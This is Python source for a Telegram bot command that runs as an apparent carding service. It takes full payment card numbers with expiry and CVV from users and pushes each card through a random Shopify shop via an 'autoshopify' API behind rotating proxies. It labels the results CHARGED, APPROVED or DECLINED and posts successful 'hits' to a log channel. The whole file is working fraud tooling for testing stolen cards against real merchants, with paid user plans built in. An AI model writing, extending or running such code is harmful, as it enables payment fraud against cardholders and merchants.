import re, random, time, html, requests as req
from telethon import events
import config, utils
from utils import mbold, sbold, premium_emoji, format_hit_log, send_hit_log
from Commands.Admin.plan import get_user_plan, PLANS

CC_PATTERN = re.compile(r'(\d{13,19})\s*[|\s]\s*(\d{1,2})\s*[|\s]\s*(\d{2,4})\s*[|\s]\s*(\d{3,4})')

def find_card(text):
    m = CC_PATTERN.search(text)
    if m:
        return m.group(1), m.group(2), m.group(3), m.group(4)
    return None

def get_bin_info(bin_num):
    for url in [
        f"https://bins.antipublic.cc/bins/{bin_num}",
        f"https://lookup.binlist.net/{bin_num}",
    ]:
        try:
            r = req.get(url, timeout=10, headers={'Accept-Version': '3', 'User-Agent': 'Mozilla/5.0'})
            if r.status_code == 200:
                data = r.json()
                if data.get('brand') or data.get('scheme') or data.get('bank'):
                    return {
                        'brand': data.get('brand') or data.get('scheme') or 'N/A',
                        'type': data.get('type') or 'N/A',
                        'bank': data.get('bank') if isinstance(data.get('bank'), str) else (data.get('bank', {}) or {}).get('name', 'N/A'),
                        'country_name': data.get('country_name') or (data.get('country', {}) or {}).get('name', 'N/A'),
                        'country_flag': data.get('country_flag') or '',
                        'level': data.get('level') or '',
                        'bin': data.get('bin') or bin_num,
                    }
        except:
            pass
    return {}

API_URL = "http://localhost:5000"

def load_sites():
    try:
        with open("Data/sites.txt") as f:
            return [s.strip() for s in f if s.strip()]
    except:
        return []

def register(client):
    @client.on(events.NewMessage(pattern=r'^/sh(\s|$|@)'))
    async def sh_command(event):
        uid = event.sender_id
        if not utils.is_authorized(event):
            return
        if not await utils.require_membership(client, event):
            return
        if utils.is_banned(uid):
            await event.reply("𝗬𝗼𝘂 𝗮𝗿𝗲 𝗕𝗮𝗻𝗻𝗲𝗱 𝗳𝗿𝗼𝗺 𝘂𝘀𝗶𝗻𝗴 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁!")
            return
        utils.add_user(uid)

        card = None
        text = event.text
        if len(text.split()) > 1:
            card = find_card(text)
        if not card and event.is_reply:
            replied = await event.get_reply_message()
            if replied and replied.text:
                card = find_card(replied.text)
        if not card:
            await event.reply((
                "𝗨𝘀𝗮𝗴𝗲\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "┗ `/sh cc|mm|yy|cvv`\n\n"
                "𝗢𝗿 𝗿𝗲𝗽𝗹𝘆 𝘁𝗼 𝗮 𝗺𝗲𝘀𝘀𝗮𝗴𝗲 𝘄𝗶𝘁𝗵 𝗰𝗮𝗿𝗱."
            ))
            return

        sites = load_sites()
        if not sites:
            await event.reply("𝗡𝗼 𝘀𝗶𝘁𝗲𝘀 𝗰𝗼𝗻𝗳𝗶𝗴𝘂𝗿𝗲𝗱! 𝗔𝗱𝗱 𝘂𝗿𝗹𝘀 𝘁𝗼 𝗗𝗮𝘁𝗮/𝟱$.𝘁𝘅𝘁, 𝟭𝟬$.𝘁𝘅𝘁, 𝟮𝟬$.𝘁𝘅𝘁")
            return

        cc, mes, ano, cvv = card
        plan_type, plan_name, _, _ = get_user_plan(uid)
        plan_display = sbold(plan_type.upper()) if plan_type else sbold('FREE')
        fname = (event.sender.first_name or "").replace('[', '').replace(']', '')

        wait = await event.reply(utils.premium_emoji(
            f"{sbold('Processing ⭕️')}\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"┗ {sbold('Checking card...')}"
        ), parse_mode='html')

        bin_info = get_bin_info(cc[:6])
        brand = bin_info.get('brand', 'N/A')
        card_type = bin_info.get('type', 'N/A')
        bank = bin_info.get('bank', 'N/A')
        country = bin_info.get('country_name', 'N/A')
        flag = bin_info.get('country_flag', '')

        site = random.choice(sites)
        price_val = random.choice(("5", "10", "20"))
        full_card = f"{cc}|{mes}|{ano}|{cvv}"
        t0 = time.time()

        _, proxy_raw = utils.get_proxy_dict()
        if not proxy_raw:
            try:
                await client.delete_messages(event.chat_id, [wait.id])
            except:
                pass
            await event.reply("╰ 𝗡𝗼 𝗽𝗿𝗼𝘅𝗶𝗲𝘀 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲")
            return

        data = {}
        for attempt in range(config.RETRY_ON_ERRORS + 1):
            try:
                resp = req.get(f"{API_URL}/autoshopify", params={
                    "site": site, "cc": full_card, "proxy": proxy_raw
                }, timeout=120)
                data = resp.json()
                if isinstance(data, list):
                    data = data[0] if data else {}
                rl = data.get("Response", "").lower()
                if not any(kw in rl for kw in config.ERROR_KEYWORDS):
                    break
            except:
                data = {"Response": "ERROR", "Gate": "UNKNOWN", "Price": "0.00",
                        "Charged": "False", "Approved": "False", "Time": "0s"}
        utils.release_proxy(proxy_raw)

        t = time.time() - t0
        clean_resp = data.get("Response", "UNKNOWN")
        gateway = data.get("Gate", "UNKNOWN")
        price = data.get("Price", "0.00")
        charged = data.get("Charged", "False")
        approved = data.get("Approved", "False")

        if charged == "True":
            title = sbold("CHARGED") + " 💎"
        elif approved == "True":
            title = sbold("APPROVED") + " ✅"
        else:
            title = sbold("DECLINED") + " ❌"

        try:
            await client.delete_messages(event.chat_id, [wait.id])
        except:
            pass

        gw_display = gateway if gateway and gateway != "UNKNOWN" else ""

        brand_u = brand.upper() if brand not in ("N/A", "/") else brand
        btype_u = card_type.upper() if card_type not in ("N/A", "/") else card_type
        lvl = bin_info.get('level', '')
        lvl_str = f" | {lvl.upper()}" if lvl and lvl not in ("N/A", "UNKNOWN", "", "/") else ""
        bin_line = f"{brand_u} | {btype_u}{lvl_str}"

        result = (
            f"{title}\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"{sbold('Card')}: <code>{full_card}</code>\n"
            f"{sbold('Response')}: {sbold(html.escape(clean_resp))}\n"
            f"{sbold('Price')}: {sbold(f'${price}')}\n"
            f"{sbold('Gateway')}: {sbold(html.escape(gw_display))}\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"{sbold('BIN')}: {sbold(html.escape(bin_line))}\n"
            f"{sbold('Bank')}: {sbold(html.escape(bank))}\n"
            f"{sbold('Country')}: {sbold(html.escape(country))} {flag}\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"{sbold('User')}: <a href=\"tg://user?id={uid}\">{html.escape(sbold(fname))}</a> [{plan_display}]"
        )

        if charged == "True":
            user_tag = f"<a href=\"tg://user?id={uid}\">{html.escape(sbold(fname))}</a> [{plan_display}]"
            log_text = format_hit_log(gw_display or "N/A", clean_resp, price, user_tag, "💎", "CHARGED")
            await send_hit_log(client, log_text)

        elif approved == "True":
            user_tag = f"<a href=\"tg://user?id={uid}\">{html.escape(sbold(fname))}</a> [{plan_display}]"
            log_text = format_hit_log(gw_display or "N/A", clean_resp, price, user_tag, "✅", "APPROVED")
            await send_hit_log(client, log_text)

        if charged == "True":
            try:
                sent = await client.send_message(uid, premium_emoji(result), parse_mode='html')
                await client.pin_message(uid, sent.id)
            except:
                pass

        await event.reply(premium_emoji(result), parse_mode='html')
